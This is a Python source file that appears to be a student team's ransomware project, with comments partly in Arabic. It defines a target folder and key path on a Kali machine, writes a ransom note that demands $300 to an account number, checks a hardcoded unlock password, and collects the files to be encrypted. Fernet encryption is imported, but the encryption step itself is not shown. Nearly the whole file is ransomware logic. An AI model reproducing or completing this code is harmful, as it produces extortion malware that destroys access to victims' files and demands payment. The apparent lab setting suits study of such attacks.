import os
import sys
import tkinter as tk
from tkinter import messagebox, simpledialog
from cryptography.fernet import Fernet
import datetime

# =========================================================================
# Developer: Doaa
# Role: Configuration, Threat Logic & Security Verification
# =========================================================================

# 1. إعداد المسارات الثابتة
FIX_TARGET_PATH = r"/home/kali/PyCharmMiscProject/dist/target_folder"
FIX_KEY_PATH = r"/home/kali/PyCharmMiscProject/dist/thekey.key"
RANSOM_NOTE_NAME = "Payment_instructions.txt"

# 2. وظيفة إنشاء رسالة التهديد (أنتِ من يحدد محتواها)
def create_threat_note(folder_path):
    note_path = os.path.join(folder_path, RANSOM_NOTE_NAME)
    try:
        with open(note_path, "w") as f:
            f.write("!!! YOUR SYSTEM IS HACKED !!!\n")
            f.write("--------------------------------\n")
            f.write(f"Attack Date: {datetime.datetime.now()}\n")
            f.write("All your files are encrypted with military-grade encryption.\n")
            f.write("To get the password, Pay $300 to: 3010333030\n")
    except Exception as e:
        print(f"Error creating note: {e}")

# 3. وظيفة التحقق من الباسورد (أنتِ الحارس)
def verify_payment_password(input_password):
    MASTER_PASSWORD = "money2024"
    return input_password == MASTER_PASSWORD



# =========================================================================
# Developer: Hanan
# Section: File System Scanning Logic
# =========================================================================

def get_target_files():
    # نستخدم المسار الثابت الذي حددته القائدة
    target_path = FIX_TARGET_PATH

    files_list = []

    if os.path.exists(target_path):
        for filename in os.listdir(target_path):
            full_path = os.path.join(target_path, filename)
            # نستبعد ملفات النظام والملفات التنفيذية
            if os.path.isfile(full_path) and not filename.endswith(".exe"):
                files_list.append(full_path)
    else:
        print(f"DEBUG: Path not found: {target_path}")

    return files_list, target_path


